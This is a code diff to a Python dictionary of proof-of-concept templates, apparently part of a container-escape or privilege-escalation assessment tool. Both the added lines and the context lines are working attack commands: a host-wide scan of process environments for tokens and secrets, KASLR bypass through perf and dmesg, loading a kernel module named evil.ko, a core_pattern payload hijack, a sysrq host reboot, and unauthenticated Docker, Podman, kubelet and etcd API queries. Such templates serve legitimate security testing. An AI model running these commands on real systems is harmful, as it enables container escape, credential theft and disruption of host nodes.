@@ -45,12 +45,17 @@ POC_TEMPLATES: dict[str, str] = {
         "make -C /lib/modules/$(uname -r)/build M=/tmp modules && insmod /tmp/evil.ko"
     ),
     "cap_sys_boot": ("# Reboot the host node (DANGEROUS)\necho b > /proc/sysrq-trigger  # or: reboot(2)"),
+    "cap_perfmon": (
+        "# Open kernel perf events to leak addresses (KASLR bypass)\n"
+        "perf record -a -g sleep 1 2>/dev/null || echo 'use perf_event_open(2) directly'"
+    ),
     "cap_syslog": (
         "# Leak kernel pointers to defeat KASLR\ndmesg | grep -iE 'kasan|0xffffffff' | head; "
         "grep -i kernel /proc/kallsyms | head"
     ),
     # ── MOUNT ─────────────────────────────────────────────────────
     "docker_socket_mount": ("curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json"),
+    "podman_sock_mount": ("curl -s --unix-socket /run/podman/podman.sock http://d/v4.0.0/libpod/containers/json"),
     "procfs_core_pattern": (
         "echo '|/tmp/payload.sh' > /proc/sys/kernel/core_pattern && "
         "echo '{payload_command}' > /tmp/payload.sh && "
@@ -210,6 +215,10 @@ POC_TEMPLATES: dict[str, str] = {
         "https://kubernetes.default.svc/api/v1/namespaces"
     ),
     "k8s_kubelet_api": ("curl -sk https://{node_ip}:10250/pods"),
+    "host_pid_namespace": (
+        "# Shared host PID namespace — read host process secrets\n"
+        "ps -ef; for p in /proc/[0-9]*; do tr '\\0' '\\n' < $p/environ 2>/dev/null; done | grep -iE 'token|secret|key'"
+    ),
     "k8s_etcd_access": ('curl -sk https://{etcd_host}:2379/v3/kv/range -d \'{{"key": "L3JlZ2lzdHJ5"}}\''),
     "docker_api_unauth": ("curl -s --unix-socket /var/run/docker.sock http://localhost/images/json"),
     "cve_2025_23266": (
